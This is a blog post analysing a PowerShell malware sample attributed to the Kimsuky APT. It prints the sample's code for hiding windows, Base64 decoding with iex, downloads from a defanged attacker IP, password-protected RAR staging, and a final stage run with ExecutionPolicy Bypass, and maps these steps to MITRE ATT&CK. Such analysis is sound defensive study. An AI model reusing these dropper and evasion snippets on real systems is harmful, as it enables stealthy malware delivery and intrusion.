<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Malware analysis - Kimsuky (NORTH KOREAN APT) Â· pwnbuffer
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="pwnbuffer">
<meta name="description" content="SUMMARY: Link to heading Introduction Technical Analysis 2.1. C# Injection with Add-Type 2.2. Process Hiding via ShowWindow 2.3. Base64 Obfuscation and Dynamic ExecutionÂ 2.4. Distraction PDF and Social Engineering 2.5. External Tools and Payload Extraction 2.6. Multi-stage Payload Execution 2.7. Final Stage Script Execution MITRE ATT&amp;CK Mapping Final Thoughts 1. INTRODUCTION Link to heading APT refers to Advanced Persistent Threat groups known for highly advanced and stealthy malware.Â The sample analyzed here is tagged as APT, Kimsuky, and written in PowerShell (.">
<meta name="keywords" content="hack the planet!">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Malware analysis - Kimsuky (NORTH KOREAN APT)">
  <meta name="twitter:description" content="SUMMARY: Link to heading Introduction Technical Analysis 2.1. C# Injection with Add-Type 2.2. Process Hiding via ShowWindow 2.3. Base64 Obfuscation and Dynamic ExecutionÂ 2.4. Distraction PDF and Social Engineering 2.5. External Tools and Payload Extraction 2.6. Multi-stage Payload Execution 2.7. Final Stage Script Execution MITRE ATT&amp;CK Mapping Final Thoughts 1. INTRODUCTION Link to heading APT refers to Advanced Persistent Threat groups known for highly advanced and stealthy malware.Â The sample analyzed here is tagged as APT, Kimsuky, and written in PowerShell (.">

<meta property="og:url" content="https://pwnbuffer.org/en/posts/c/exploring-kimsuky-malware/">
  <meta property="og:site_name" content="pwnbuffer">
  <meta property="og:title" content="Malware analysis - Kimsuky (NORTH KOREAN APT)">
  <meta property="og:description" content="SUMMARY: Link to heading Introduction Technical Analysis 2.1. C# Injection with Add-Type 2.2. Process Hiding via ShowWindow 2.3. Base64 Obfuscation and Dynamic ExecutionÂ 2.4. Distraction PDF and Social Engineering 2.5. External Tools and Payload Extraction 2.6. Multi-stage Payload Execution 2.7. Final Stage Script Execution MITRE ATT&amp;CK Mapping Final Thoughts 1. INTRODUCTION Link to heading APT refers to Advanced Persistent Threat groups known for highly advanced and stealthy malware.Â The sample analyzed here is tagged as APT, Kimsuky, and written in PowerShell (.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-05-08T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-05-08T00:00:00+00:00">
    <meta property="article:tag" content="Malware">
    <meta property="article:tag" content="Techniques">




<link rel="canonical" href="https://pwnbuffer.org/en/posts/c/exploring-kimsuky-malware/">


<link rel="preload" href="https://pwnbuffer.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://pwnbuffer.org/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="https://pwnbuffer.org/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.org/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-32x32.ico" sizes="32x32">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-16x16.ico" sizes="16x16">

<link rel="apple-touch-icon" href="https://pwnbuffer.org/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.org/images/apple-touch-icon.png">

<link rel="manifest" href="https://pwnbuffer.org/site.webmanifest">
<link rel="mask-icon" href="https://pwnbuffer.org/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-dark">
  

  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://pwnbuffer.org/en/">
      pwnbuffer
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/about/">About</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/posts/">Articles</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/categories/">Categories</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/members/">Members</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/contribute/">Contribute</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/wallpapers/">Wallpapers</a>
            </li>
          
        
        
          
          
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://pwnbuffer.org/posts/c/exploring-kimsuky-malware/">ðŸ‡§ðŸ‡·</a>
              </li>
            
          
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://pwnbuffer.org/en/posts/c/exploring-kimsuky-malware/">
              Malware analysis - Kimsuky (NORTH KOREAN APT)
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2025-05-08T00:00:00Z">
                May 8, 2025
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              3-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/en/authors/untw0/">Untw0</a></div>

          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/en/categories/malware-analysis/">Malware-Analysis</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/malware/">Malware</a>
    </span>
      <span class="separator">â€¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/techniques/">Techniques</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <hr>
<h2 id="summary">
  SUMMARY:
  <a class="heading-link" href="#summary">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<ol>
<li><a href="#1-introduction" >Introduction</a> Â </li>
<li><a href="#2-technical-analysis" >Technical Analysis</a> Â <br>
Â  Â 2.1. <a href="#21-c-injection-with-add-type" >C# Injection with Add-Type</a> Â <br>
Â  Â 2.2. <a href="#22-process-hiding-via-showwindow" >Process Hiding via ShowWindow</a> Â <br>
Â  Â 2.3. <a href="#22-process-hiding-via-showwindow" >Base64 Obfuscation and Dynamic Execution</a>Â <br>
Â  Â 2.4. <a href="#24-distraction-pdf-and-social-engineering" >Distraction PDF and Social Engineering</a> Â <br>
Â  Â 2.5. <a href="#25-external-tools-and-payload-extraction" >External Tools and Payload Extraction</a> Â <br>
Â  Â 2.6. <a href="#26-multi-stage-payload-execution" >Multi-stage Payload Execution</a> Â <br>
Â  Â 2.7. <a href="#27-final-stage-script-execution" >Final Stage Script Execution</a> Â </li>
<li><a href="#3-mitre-attck-mapping" >MITRE ATT&amp;CK Mapping</a> Â </li>
<li><a href="#4-final-thoughts" >Final Thoughts</a> Â </li>
</ol>
<hr>
<h2 id="1-introduction">
  1. INTRODUCTION
  <a class="heading-link" href="#1-introduction">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>APT refers to Advanced Persistent Threat groups known for highly advanced and stealthy malware.Â 
The sample analyzed here is tagged as <strong>APT</strong>, <strong>Kimsuky</strong>, and written in PowerShell (<code>.ps1</code>), found on Malware Bazaar. Â </p>
<p><strong>Objective:</strong> Learn advanced evasion and staging techniques.</p>
<hr>
<h2 id="2-technical-analysis">
  2. TECHNICAL ANALYSIS
  <a class="heading-link" href="#2-technical-analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="21-c-injection-with-add-type">
  2.1. C# Injection with Add-Type
  <a class="heading-link" href="#21-c-injection-with-add-type">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
<label for="tab-0-0" class="tab-label">powershell</label>
<div class="tab-content tab-content-0-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ec0000">$sd</span> = <span style="color:#ec0000">Add-Type</span> <span style="color:#008900">@&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#008900">using System;
</span></span></span><span style="display:flex;"><span><span style="color:#008900">using System.Diagnostics;
</span></span></span><span style="display:flex;"><span><span style="color:#008900">using System.Runtime.InteropServices;
</span></span></span><span style="display:flex;"><span><span style="color:#008900">public class WinHpXN
</span></span></span><span style="display:flex;"><span><span style="color:#008900">{
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  [DllImport(&#34;user32.dll&#34;)]
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  public static void SwMng(int processId, int sw)
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  {
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  Â  Â  Process process = Process.GetProcessById(processId);
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  Â  Â  IntPtr hWnd = process.MainWindowHandle;
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  Â  Â  if (hWnd != IntPtr.Zero)
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  Â  Â  Â  Â  ShowWindow(hWnd, sw);
</span></span></span><span style="display:flex;"><span><span style="color:#008900">Â  Â  }
</span></span></span><span style="display:flex;"><span><span style="color:#008900">}
</span></span></span><span style="display:flex;"><span><span style="color:#008900">&#34;@</span>
</span></span></code></pre></div>
</div>




</div>



<ul>
<li>The script uses <code>Add-Type</code> to inject and compile C# code inline.</li>
<li>Class <code>WinHpXN</code> is created to P/Invoke <code>ShowWindow</code> from <code>user32.dll</code>.</li>
<li>Purpose: Hide or show windows from specific processes.</li>
</ul>
<p><code>sw</code> values:</p>
<ul>
<li>0 = <code>SW_HIDE</code> â†’ hide window Â </li>
<li>5 = <code>SW_SHOW</code> â†’ show window (not used here)</li>
</ul>
<h3 id="22-process-hiding-via-showwindow">
  2.2. Process Hiding via ShowWindow
  <a class="heading-link" href="#22-process-hiding-via-showwindow">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
<label for="tab-1-0" class="tab-label">powershell</label>
<div class="tab-content tab-content-1-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ec0000">$fd</span> = <span style="color:#ec0000">Get-Process</span> -Name powershell,WindowsTerminal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">foreach</span> (<span style="color:#ec0000">$fz</span> <span style="color:#ec0000">in</span> <span style="color:#ec0000">$fd</span>) {
</span></span><span style="display:flex;"><span>Â  Â  [<span style="color:#008900">WinHpXN</span>]::SwMng(<span style="color:#ec0000">$fz</span>.Id, <span style="color:#008900">0</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</div>




</div>



<ul>
<li>Uses <code>Get-Process</code> to find <code>powershell</code>, <code>WindowsTerminal</code>.</li>
<li>Hides their GUI: visual evasion and stealth against analysts or sandboxes.</li>
</ul>
<h3 id="23-base64-obfuscation-and-dynamic-execution">
  2.3. Base64 Obfuscation and Dynamic Execution
  <a class="heading-link" href="#23-base64-obfuscation-and-dynamic-execution">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-2-0:checked ~ .tab-content-2-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-0" checked/>
<label for="tab-2-0" class="tab-label">powershell</label>
<div class="tab-content tab-content-2-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ec0000">$gvb</span> = [<span style="color:#008900">System.Text.Encoding</span>]::UTF8.GetString([<span style="color:#008900">Convert</span>]::FromBase64String(<span style="color:#ec0000">$sd</span>.Replace(<span style="color:#008900">&#39;@&#39;</span>, <span style="color:#008900">&#39;&#39;</span>)))
</span></span><span style="display:flex;"><span><span style="color:#ec0000">iex </span><span style="color:#ec0000">$gvb</span>
</span></span></code></pre></div>
</div>




</div>



<ul>
<li>Removes &lsquo;@&rsquo; to bypass AV pattern matching.</li>
<li>Decodes and executes obfuscated code via <code>Invoke-Expression</code>.</li>
</ul>
<div class="notice note">
  <div class="notice-title">
    <i class="fa-solid fa-sticky-note" aria-hidden="true"></i>Note
  </div>
  <div class="notice-content">This malware came with <strong>&rsquo;@&rsquo;</strong> inside the obfuscation to evade detection.</div>
</div>

<h3 id="24-distraction-pdf-and-social-engineering">
  2.4. Distraction PDF and Social Engineering
  <a class="heading-link" href="#24-distraction-pdf-and-social-engineering">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-3-0:checked ~ .tab-content-3-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-3" id="tab-3-0" checked/>
<label for="tab-3-0" class="tab-label">powershell</label>
<div class="tab-content tab-content-3-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ec0000">Invoke-WebRequest</span> -Uri <span style="color:#008900">&#34;http://92[.]119[.]114[.]128/doc.pdf&#34;</span> -OutFile <span style="color:#008900">&#34;</span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">\Distribution Document.pdf&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">Start-Process</span> -FilePath <span style="color:#008900">&#34;Distribution Document.pdf&#34;</span>
</span></span></code></pre></div>
</div>




</div>



<ul>
<li>Downloads and opens a PDF as decoy during malicious activity. Â </li>
<li><strong>Criminal IP:</strong> <code>92.119.114.128</code></li>
</ul>
<h3 id="25-external-tools-and-payload-extraction">
  2.5. External Tools and Payload Extraction
  <a class="heading-link" href="#25-external-tools-and-payload-extraction">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-4-0:checked ~ .tab-content-4-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-4" id="tab-4-0" checked/>
<label for="tab-4-0" class="tab-label">powershell</label>
<div class="tab-content tab-content-4-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ec0000">Invoke-WebRequest</span> -Uri <span style="color:#008900">&#34;http://92[.]119[.]114[.]128/Assets/UnRAR.exe&#34;</span>
</span></span></code></pre></div>
</div>




</div>



<ul>
<li>Downloads <code>UnRAR.exe</code> to extract password-protected <code>.rar</code> files. Â </li>
<li><strong>Avoids</strong> native <code>Expand-Archive</code> to evade detection.</li>
</ul>
<h3 id="26-multi-stage-payload-execution">
  2.6. Multi-stage Payload Execution
  <a class="heading-link" href="#26-multi-stage-payload-execution">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-5-0:checked ~ .tab-content-5-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-5" id="tab-5-0" checked/>
<label for="tab-5-0" class="tab-label">powershell</label>
<div class="tab-content tab-content-5-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cmd.exe /C <span style="color:#008900">&#34;</span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">\UnRAR.exe x -ppoiuytrewq1234 -o+ </span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">\orwartde.rar </span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">Start-Process</span> -FilePath orwartde.exe
</span></span></code></pre></div>
</div>




</div>



<ul>
<li>Uses password-protected RAR to extract malicious binaries.</li>
<li>Runs multiple stages (e.g., <code>orwartde.exe</code>, <code>enwtsv.exe</code>) to increase persistence.</li>
</ul>
<h3 id="27-final-stage-script-execution">
  2.7. Final Stage Script Execution
  <a class="heading-link" href="#27-final-stage-script-execution">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-6-0:checked ~ .tab-content-6-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-6" id="tab-6-0" checked/>
<label for="tab-6-0" class="tab-label">powershell</label>
<div class="tab-content tab-content-6-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ec0000">$t</span> = <span style="color:#ec0000">Invoke-WebRequest</span> ...
</span></span><span style="display:flex;"><span><span style="color:#ec0000">$gds</span> = [<span style="color:#008900">System.Text.Encoding</span>]::UTF8.GetString([<span style="color:#008900">Convert</span>]::FromBase64String(<span style="color:#ec0000">$t</span>))
</span></span><span style="display:flex;"><span><span style="color:#ec0000">Set-Content</span> -Path <span style="color:#008900">&#34;</span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">\ov4_dd_pf.txt&#34;</span> -Value <span style="color:#ec0000">$gds</span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">if</span> (<span style="color:#ec0000">Test-Path</span> <span style="color:#008900">&#34;</span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">\ov4_dd_pf.ps1&#34;</span>) {
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#ec0000">Remove-Item</span> -Path <span style="color:#008900">&#34;</span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">\ov4_dd_pf.ps1&#34;</span> -Force
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>cmd.exe /C <span style="color:#008900">&#34;powershell -ExecutionPolicy Bypass -File </span><span style="color:#ec0000">$env:TEMP</span><span style="color:#008900">\ov4_dd_pf.ps1&#34;</span>
</span></span></code></pre></div>
</div>




</div>



<ul>
<li>Downloads another base64 PowerShell payload and executes it.</li>
<li>Uses <code>.txt</code> to <code>.ps1</code> renaming to evade AV.</li>
<li>Runs using <code>ExecutionPolicy Bypass</code>.</li>
</ul>
<hr>
<h2 id="3-mitre-attck-mapping">
  3. MITRE ATT&amp;CK MAPPING
  <a class="heading-link" href="#3-mitre-attck-mapping">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="defense-evasion">
  Defense Evasion
  <a class="heading-link" href="#defense-evasion">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<ul>
<li><strong><a href="https://attack.mitre.org/techniques/T1027/"  class="external-link" target="_blank" rel="noopener">T1027:</a></strong> Obfuscated Files (Base64) Â </li>
<li><strong><a href="https://attack.mitre.org/techniques/T1027/002/"  class="external-link" target="_blank" rel="noopener">T1027.002:</a></strong> Packed Files (.rar with password) Â </li>
<li><strong><a href="https://attack.mitre.org/techniques/T1218/"  class="external-link" target="_blank" rel="noopener">T1218:</a></strong> Signed Binary Proxy Execution (cmd.exe, Start-Process) Â </li>
<li><strong><a href="https://attack.mitre.org/techniques/T1036/"  class="external-link" target="_blank" rel="noopener">T1036:</a></strong> Masquerading (.ps1 disguised as .txt) Â </li>
<li><strong><a href="https://attack.mitre.org/techniques/T1548/002/"  class="external-link" target="_blank" rel="noopener">T1548.002:</a></strong> Bypass User Account Control (ExecutionPolicy Bypass) Â </li>
</ul>
<h3 id="command-and-control">
  Command and Control
  <a class="heading-link" href="#command-and-control">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<ul>
<li><strong><a href="https://attack.mitre.org/techniques/T1071/001/"  class="external-link" target="_blank" rel="noopener">T1071.001:</a></strong> Application Layer Protocol (HTTP) Â </li>
<li><strong><a href="https://attack.mitre.org/techniques/T1105/"  class="external-link" target="_blank" rel="noopener">T1105:</a></strong> Ingress Tool Transfer (Downloads: .exe, .rar) Â </li>
</ul>
<h3 id="discovery">
  Discovery
  <a class="heading-link" href="#discovery">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<ul>
<li><strong><a href="https://attack.mitre.org/techniques/T1057/"  class="external-link" target="_blank" rel="noopener">T1057:</a></strong> Process Discovery (Get-Process to find terminals)</li>
</ul>
<hr>
<h2 id="4-final-thoughts">
  4. FINAL THOUGHTS
  <a class="heading-link" href="#4-final-thoughts">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>In my opinion, we were able to learn a lot, especially interesting Â 
APT techniques that can be used in the real world.</p>
<p><strong>Thx for reading!</strong> Â 
â€” <a href="https://www.linkedin.com/maiquel-paiva"  class="external-link" target="_blank" rel="noopener">@untw0</a> ðŸ˜Š</p>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
    onload="renderMathInElement(document.body,
      {
        delimiters: [
          {left: '$$', right: '$$', display:true},
          {left: '$', right: '$', display:false},
          {left: '\\(', right: '\\)', display: false},
          {left: '\\[', right: '\\]', display: true}
        ]
      }
    );"></script>
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    Â©
    
    2025
     pwnbuffer 
    Â·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://pwnbuffer.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
